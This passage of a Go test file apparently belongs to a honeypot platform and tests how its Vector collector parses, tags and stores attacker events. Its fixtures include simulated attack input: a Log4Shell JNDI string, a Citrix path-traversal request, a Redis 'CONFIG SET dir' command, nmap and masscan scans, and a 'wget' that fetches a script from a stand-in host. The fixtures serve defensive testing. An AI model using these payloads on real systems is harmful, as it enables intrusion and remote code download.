			r.Metadata["device_profile"] != want.profile || r.Metadata["exception_code"] != want.exception {
			t.Errorf("current Conpot image fixture %d: got %+v, want %+v", i, r, want)
		}
		event := &database.Event{Honeypot: r.Honeypot, EventType: r.EventType, SourceIP: r.SourceIP, Protocol: r.Protocol, Metadata: r.Metadata}
		classifier.Classify(t.Context(), event)
		// T1692.001 Unauthorized Command Message (ATT&CK v18; it replaced T0855).
		if want.operation == "write" && event.TechniqueID != "T1692.001" || want.operation != "write" && event.TechniqueID == "T1692.001" {
			t.Errorf("Conpot %s operation %q classified as %s", r.EventType, want.operation, event.TechniqueID)
		}
	}

	want := []struct {
		hp, ip   string
		sp, dp   int
		et       string
		proto    string
		cmd, pay string
	}{
		{"tanner", "203.0.113.20", 40112, 80, "tanner.http.get", "http", "", "/wp-login.php"},
		{"dicompot", "203.0.113.21", 52800, 11112, "dicompot.connection_from", "", "", ""},
		{"ddospot", "203.0.113.22", 52840, 53, "ddospot.dns.attack_start", "udp", "", "example.com."},
		{"hellpot", "203.0.113.23", 0, 80, "hellpot.new", "http", "", "/.env"},
		{"log4pot", "203.0.113.24", 42458, 8080, "log4pot.request", "http", "", "GET /?x=${jndi:ldap://a/b} HTTP/1.1"},
		{"citrixhoneypot", "203.0.113.25", 51234, 443, "citrixhoneypot.http.request", "https", "", "GET /vpn/../vpns/cfg/smb.conf"},
		{"galah", "203.0.113.26", 39202, 8080, "galah.successfulresponse", "http", "", "/admin"},
		{"mailoney", "203.0.113.27", 34714, 25, "mailoney.session", "smtp", "HELO x\nAUTH LOGIN", ""},
		{"redishoneypot", "203.0.113.28", 37198, 6379, "redishoneypot.command", "redis", "CONFIG SET dir /tmp", ""},
		{"go-pot", "203.0.113.29", 0, 80, "go-pot.http.get", "http", "", "/admin/login.php?user=root"},
		{"beelzebub", "203.0.113.30", 55688, 22, "beelzebub.new_ssh_session", "ssh", "uname -a", ""},
		{"ciscoasa", "203.0.113.31", 40596, 8443, "ciscoasa.error", "tcp", "", ""},
		{"sentrypeer", "203.0.113.32", 5061, 5060, "sentrypeer.sip.options", "sip", "", ""},
		{"medpot", "203.0.113.33", 44462, 2575, "medpot.connection_found", "", "", ""},
	}
	for i, w := range want {
		r := rows[11+i]
		if r.Honeypot != w.hp || r.SourceIP != w.ip || r.SourcePort != w.sp || r.DestPort != w.dp ||
			r.EventType != w.et || r.Protocol != w.proto || r.Command != w.cmd || r.Payload != w.pay {
			t.Errorf("%s:\n got %+v\nwant %+v", w.hp, r, w)
		}
	}
}

// TestVectorConfigValidatesLive runs `vector validate` over the full generated
// collector config for each backend, with and without the NSM sensors, so an
// option the real sink/transform does not accept fails here instead of
// crash-looping the collector container.
func TestVectorConfigValidatesLive(t *testing.T) {
	dir := t.TempDir()
	run := vectorRunner(t, dir)
	for _, db := range []string{"clickhouse", "timescaledb"} {
		for _, sensors := range []bool{false, true} {
			out := genVectorCfg(t, func(c *config.Config) {
				c.Database.Type = db
				for _, n := range []string{"endlessh", "dionaea", "conpot", "heralding", "adbhoney"} {
					hp := c.Honeypots[n]
					hp.Enabled = true
					c.Honeypots[n] = hp
				}
				c.Collector.IngestSuricata = sensors
				c.Collector.IngestP0f = sensors
				c.Collector.IngestFatt = sensors
			})
			out = strings.Replace(out, `data_dir: "/var/lib/vector"`, `data_dir: "`+dir+`"`, 1)
			path := filepath.Join(dir, db+".yaml")
			if err := os.WriteFile(path, []byte(out), 0o644); err != nil {
				t.Fatal(err)
			}
			cmd := exec.Command(run[0], append(run[1:], "validate", "--no-environment", path)...)
			if b, err := cmd.CombinedOutput(); err != nil {
				t.Errorf("%s (sensors=%v): vector validate failed: %v\n%s", db, sensors, err, b)
			}
		}
	}
}

// Edge configurations that used to render a config Vector rejects (so the
// collector crash-looped and nothing was collected): no honeypot enabled
// (with and without sensors), and probe blocking on with an empty probe list.
func TestVectorEdgeConfigsValidateLive(t *testing.T) {
	dir := t.TempDir()
	run := vectorRunner(t, dir)
	cases := map[string]func(c *config.Config){
		"no-honeypots-with-sensors": func(c *config.Config) {
			for name, hp := range c.Honeypots {
				hp.Enabled = false
				c.Honeypots[name] = hp
			}
			c.Collector.IngestSuricata = true
		},
		"nothing-to-collect": func(c *config.Config) {
			for name, hp := range c.Honeypots {
				hp.Enabled = false
				c.Honeypots[name] = hp
			}
			c.Collector.IngestSuricata, c.Collector.IngestP0f, c.Collector.IngestFatt = false, false, false
		},
		"empty-probe-list": func(c *config.Config) {
			c.Stealth.BlockCommonProbes = true
			c.Stealth.BlockedProbes = nil
		},
	}
	for name, mut := range cases {
		out := genVectorCfg(t, mut)
		if strings.Contains(out, "!()") {
			t.Errorf("%s: empty VRL expression rendered", name)
		}
		out = strings.Replace(out, `data_dir: "/var/lib/vector"`, `data_dir: "`+dir+`"`, 1)
		path := filepath.Join(dir, name+".yaml")
		if err := os.WriteFile(path, []byte(out), 0o644); err != nil {
			t.Fatal(err)
		}
		if b, err := exec.Command(run[0], append(run[1:], "validate", "--no-environment", path)...).CombinedOutput(); err != nil {
			t.Errorf("%s: vector validate failed: %v\n%s", name, err, b)
		}
	}
}

// eventUUID is the shape of the ID the collector derives from a log line: a
// version 8 UUID (RFC 9562: a hash the application defines), which a random
// ID from the database or an older build is not.
var eventUUID = regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-8[0-9a-f]{3}-8[0-9a-f]{3}-[0-9a-f]{12}$`)

// TestVectorKeepsScannerEvidenceLive runs honeypot lines through the two
// transforms every event passes (add_qpot_metadata, tag_scanners) in the real
// Vector. Before, the second one was a filter that dropped any event naming a
// scanner, on by default: an attacker running nmap inside a honeypot, or a
// scanner's own SSH banner, never reached the database, the intelligence
// worker or the log backup. Every line must come out, the scanner ones
// tagged, and none may carry the QPot ID - not even one a log line brings.
func TestVectorKeepsScannerEvidenceLive(t *testing.T) {
	dir := t.TempDir()
	run := vectorRunner(t, dir)
	firstIDs := map[int]string{}
	for _, tagging := range []bool{true, false} {
		cfg := config.Default("vec-scan")
		cfg.QPotID = "qp_vectorvectorvectorvecto"
		cfg.Stealth.BlockCommonProbes = tagging
		hp := cfg.Honeypots["cowrie"]
		hp.Enabled = true
		cfg.Honeypots["cowrie"] = hp
		sb, _ := security.NewSandbox(&cfg.Security)
		out, err := (&ComposeGenerator{Config: cfg, Sandbox: sb}).GenerateVectorConfig()
		if err != nil {
			t.Fatal(err)
		}
		var vc struct {
			Transforms map[string]struct {
				Source string `yaml:"source"`
			} `yaml:"transforms"`
		}
		if err := yaml.Unmarshal([]byte(out), &vc); err != nil {
			t.Fatal(err)
		}
		meta, tag := vc.Transforms["add_qpot_metadata"].Source, vc.Transforms["tag_scanners"].Source
		if meta == "" || tag == "" {
			t.Fatal("the generated config lacks add_qpot_metadata or tag_scanners")
		}
		outPath := filepath.Join(dir, fmt.Sprintf("out-%v.json", tagging))
		harness := map[string]any{
			"data_dir": dir,
			"sources":  map[string]any{"in": map[string]any{"type": "stdin"}},
			"transforms": map[string]any{
				"split": map[string]any{"type": "remap", "inputs": []string{"in"},
					"source": "parts = split(string!(.message), \"\\t\", 2)\n.file = parts[0]\n.message = parts[1]\n"},
				"meta": map[string]any{"type": "remap", "inputs": []string{"split"}, "source": meta},
				"tag":  map[string]any{"type": "remap", "inputs": []string{"meta"}, "source": tag},
			},
			"sinks": map[string]any{"out": map[string]any{"type": "file", "inputs": []string{"tag"},
				"path": outPath, "encoding": map[string]any{"codec": "json"}}},
		}
		hb, err := yaml.Marshal(harness)
		if err != nil {
			t.Fatal(err)
		}
		cfgPath := filepath.Join(dir, fmt.Sprintf("scan-%v.yaml", tagging))
		if err := os.WriteFile(cfgPath, hb, 0o644); err != nil {
			t.Fatal(err)
		}
		const file = "/data/honeypots/cowrie/logs/cowrie.json\t"
		in := strings.Join([]string{
			file + `{"eventid":"cowrie.command.input","input":"nmap -sV 192.0.2.10","message":"CMD: nmap -sV 192.0.2.10","src_ip":"203.0.113.9","session":"s1"}`,
			file + `{"eventid":"cowrie.client.version","version":"SSH-2.0-ZGrab ZGrab SSH Survey","message":"Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey","src_ip":"203.0.113.10","session":"s2"}`,
			file + `{"eventid":"cowrie.command.input","input":"masscan -p22 10.0.0.0/8 --rate 1000","message":"CMD: masscan -p22 10.0.0.0/8 --rate 1000","src_ip":"203.0.113.9","session":"s1"}`,
			file + `{"eventid":"cowrie.command.input","input":"uname -a","message":"CMD: uname -a","src_ip":"203.0.113.9","session":"s1"}`,
			file + `{"eventid":"cowrie.command.input","input":"id","message":"CMD: id","src_ip":"203.0.113.11","session":"s3","qpot_id":"qp_forgedforgedforgedforged","sensor_id":"qs_forgedforgedforgedforged"}`,
		}, "\n") + "\n"
		cmd := exec.Command(run[0], append(run[1:], "--quiet", "--config", cfgPath)...)
		cmd.Stdin = strings.NewReader(in)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			t.Fatalf("vector failed: %v\n%s", err, stderr.String())
		}
		raw, err := os.ReadFile(outPath)
		if err != nil {
			t.Fatalf("no output: %v\n%s", err, stderr.String())
		}
		if bytes.Contains(raw, []byte(cfg.QPotID)) || bytes.Contains(raw, []byte("qpot_id")) || bytes.Contains(raw, []byte("forged")) {
			t.Errorf("tagging=%v: the output carries a QPot ID field or a forged identifier:\n%s", tagging, raw)
		}
		type row struct {
			Command  string            `json:"command"`
			Metadata map[string]string `json:"metadata"`
			SensorID string            `json:"sensor_id"`
			EventID  string            `json:"event_id"`
		}
		var rows []row
		for _, line := range bytes.Split(bytes.TrimSpace(raw), []byte("\n")) {
			var r row
			if err := json.Unmarshal(line, &r); err != nil {
				t.Fatalf("bad output line %q: %v", line, err)
			}
			rows = append(rows, r)
		}
		wantScanner := []string{"nmap", "zgrab", "masscan", "", ""}
		if len(rows) != len(wantScanner) {
			t.Fatalf("tagging=%v: %d of %d events came out:\n%s", tagging, len(rows), len(wantScanner), raw)
		}
		for i, r := range rows {
			want := wantScanner[i]
			if !tagging {
				want = ""
			}
			if r.Metadata["scanner"] != want {
				t.Errorf("tagging=%v: event %d (%q) has scanner tag %q, want %q", tagging, i, r.Command, r.Metadata["scanner"], want)
			}
			if r.SensorID != cfg.SensorID() {
				t.Errorf("tagging=%v: event %d has sensor_id %q, want %q", tagging, i, r.SensorID, cfg.SensorID())
			}
			if r.Metadata["session"] == "" {
				t.Errorf("tagging=%v: event %d lost its metadata: %+v", tagging, i, r.Metadata)
			}
		}
		// Each line has an ID of its own, derived from the line: the same
		// in both runs, so a batch sent twice is the same batch.
		ids := map[string]bool{}
		for i, r := range rows {
			if !eventUUID.MatchString(r.EventID) || ids[r.EventID] {
				t.Errorf("tagging=%v: event %d has ID %q (not a UUID, or shared with another line)", tagging, i, r.EventID)
			}
			ids[r.EventID] = true
			if firstIDs[i] == "" {
				firstIDs[i] = r.EventID
			} else if firstIDs[i] != r.EventID {
				t.Errorf("event %d got ID %s in one run and %s in another", i, firstIDs[i], r.EventID)
			}
		}
		if rows[0].Command != "nmap -sV 192.0.2.10" {
			t.Errorf("the nmap command is stored as %q", rows[0].Command)
		}
	}
}

// TestVectorRecordsADiscardedLineLive runs the whole generated collector
// configuration, its sinks replaced by a file, over a log that holds a line
// longer than the collector reads (102,400 bytes).
//
// The collector discards such a line whole, and nothing used to record that:
// on a live instance a visitor's command of 60,000 characters, which cowrie
// writes twice in one line, was in neither the database nor the log backup.
// The discarded line must come out as an event of its honeypot that names the
// visitor and carries the start of the line.
func TestVectorRecordsADiscardedLineLive(t *testing.T) {
	docker, err := exec.LookPath("docker")
	if err != nil {
		t.Skip("docker is not available")
	}
	if exec.Command(docker, "image", "inspect", CollectorImage).Run() != nil {
		t.Skip("the collector image is not present locally")
	}
	dir := t.TempDir()
	logs, work := filepath.Join(dir, "logs"), filepath.Join(dir, "work")
	for _, d := range []string{logs, work} {
		if err := os.Mkdir(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Chmod(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	long := `{"eventid":"cowrie.command.input","src_ip":"::ffff:203.0.113.20","src_port":4022,"session":"longsess","input":"wget http://198.51.100.77/x.sh; echo ` + strings.Repeat("B", 150000) + `"}`
	lines := []string{
		`{"eventid":"cowrie.session.connect","src_ip":"203.0.113.1","src_port":40001,"dst_port":22,"session":"plain1","protocol":"ssh"}`,
		long,
		`{"eventid":"cowrie.session.closed","src_ip":"203.0.113.1","session":"plain1","protocol":"ssh"}`,
	}
	if err := os.WriteFile(filepath.Join(logs, "cowrie.json"), []byte(strings.Join(lines, "\n")+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	var cfg map[string]any
	generated := genVectorCfg(t, nil)
	if err := yaml.Unmarshal([]byte(generated), &cfg); err != nil {
		t.Fatalf("the generated collector configuration is not YAML: %v", err)
	}
	if sinks, _ := cfg["sinks"].(map[string]any); sinks["clickhouse"] == nil {
		t.Fatalf("the generated configuration has no database sink: %v", cfg["sinks"])
	}
	cfg["data_dir"] = "/work"
	delete(cfg, "api")
	// What the database sink and the log backup are given: tag_scanners.
	cfg["sinks"] = map[string]any{"out": map[string]any{"type": "file", "inputs": []string{"tag_scanners"},
		"path": "/work/out.json", "encoding": map[string]any{"codec": "json"}}}
	rendered, err := yaml.Marshal(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "vector.yaml"), rendered, 0o644); err != nil {
		t.Fatal(err)
	}
	name := fmt.Sprintf("qpot-test-discard-%d", os.Getpid())
	// The collector runs as root, as in an instance: hand its files back so
	// the test's own cleanup can remove them.
	t.Cleanup(func() {
		_ = exec.Command(docker, "rm", "-f", name).Run()
		if uid := os.Getuid(); uid > 0 {
			out, err := exec.Command(docker, "run", "--rm", "--network", "none", "--user", "0:0", "--entrypoint", "chown",
				"-v", work+":/work", CollectorImage, "-R", fmt.Sprintf("%d:%d", uid, os.Getgid()), "/work").CombinedOutput()
			if err != nil {
				t.Logf("hand the collector's files back: %v %s", err, out)
			}
		}
	})
	if out, err := exec.Command(docker, "run", "-d", "--name", name, "--network", "none", "--user", "0:0",
		"-v", logs+":/data/honeypots/cowrie/logs:ro", "-v", work+":/work", "-v", filepath.Join(dir, "vector.yaml")+":/etc/vector/qpot.yaml:ro",
		CollectorImage, "--config", "/etc/vector/qpot.yaml").CombinedOutput(); err != nil {
		t.Fatalf("start the collector: %v\n%s", err, out)
	}

	type row struct {
		Honeypot  string            `json:"honeypot"`
		EventType string            `json:"event_type"`
		SourceIP  string            `json:"source_ip"`
		Command   string            `json:"command"`
		Payload   string            `json:"payload"`
		Metadata  map[string]string `json:"metadata"`
		EventID   string            `json:"event_id"`
		SensorID  string            `json:"sensor_id"`
	}
	var rows []row
	deadline := time.Now().Add(60 * time.Second)
	for {
		rows = rows[:0]
		raw, _ := os.ReadFile(filepath.Join(work, "out.json"))
		for _, line := range bytes.Split(bytes.TrimSpace(raw), []byte("\n")) {
			var r row
			if len(line) > 0 && json.Unmarshal(line, &r) == nil {
				rows = append(rows, r)
			}
		}
		if len(rows) >= 3 || time.Now().After(deadline) {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if len(rows) != 3 {
		log, _ := exec.Command(docker, "logs", "--tail", "40", name).CombinedOutput()
		if len(log) > 6000 {
			log = log[:6000]
		}
		t.Fatalf("%d events came out, want 3 (two plain lines and the discarded one): %+v\ncollector:\n%s", len(rows), rows, log)
	}
	types := map[string]row{}
	for _, r := range rows {
		types[r.EventType] = r
	}
	for _, plain := range []string{"cowrie.session.connect", "cowrie.session.closed"} {
		if r, ok := types[plain]; !ok || r.SourceIP != "203.0.113.1" || r.Metadata["session"] != "plain1" {
			t.Errorf("the plain line %s beside the long one: %+v", plain, r)
		}
	}
	r, ok := types["cowrie.log.line_discarded"]
	if !ok {
		t.Fatalf("no event for the discarded line: %+v", rows)
	}
	if r.Honeypot != "cowrie" || r.SourceIP != "203.0.113.20" || r.Metadata["session"] != "longsess" ||
		r.Metadata["limit_bytes"] != "102400" || r.Metadata["sensor"] != "collector" || r.Command != "" {
		t.Errorf("the discarded line's event does not name the honeypot, the visitor and the limit: %+v", r)
	}
	if !strings.HasPrefix(r.Payload, `{"eventid":"cowrie.command.input","src_ip":"::ffff:203.0.113.20"`) ||
		!strings.Contains(r.Payload, "wget http://198.51.100.77/x.sh; echo BBBB") || len(r.Payload) < 500 || len(r.Payload) > 2048 {
		t.Errorf("the discarded line's event carries %d bytes of it: %.200q", len(r.Payload), r.Payload)
	}
	if !eventUUID.MatchString(r.EventID) || r.SensorID == "" {
		t.Errorf("the discarded line's event has ID %q and sensor %q", r.EventID, r.SensorID)
	}
}
